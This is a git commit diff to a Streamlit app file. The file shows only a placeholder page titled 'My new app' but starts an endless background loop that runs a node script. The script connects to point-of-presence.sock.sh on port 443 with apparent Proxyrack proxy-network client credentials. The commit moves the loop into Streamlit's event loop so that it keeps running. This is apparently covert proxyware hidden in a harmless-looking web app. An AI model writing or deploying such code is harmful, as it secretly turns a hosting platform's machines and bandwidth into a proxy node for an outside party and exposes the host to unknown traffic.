2fc74787568ab1f85cb4c35c66e81c185192cc83
chaowenguo0 <chaowen.guo1@gmail.com>
2025-10-30 04:16:46 -0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,10 +1,10 @@
-import streamlit, asyncio, pathlib, nest_asyncio
-nest_asyncio.apply()
+import streamlit, asyncio, pathlib
+loop = streamlit.runtime.get_instance()._get_async_objs().eventloop
 
 async def main():
     while True:
         node = await asyncio.create_subprocess_exec('node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'c' + '0' * 63, '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP')
         await node.wait()
 
-asyncio.run(main())
+loop.create_task(main())
 streamlit.title("🎈 My new app")
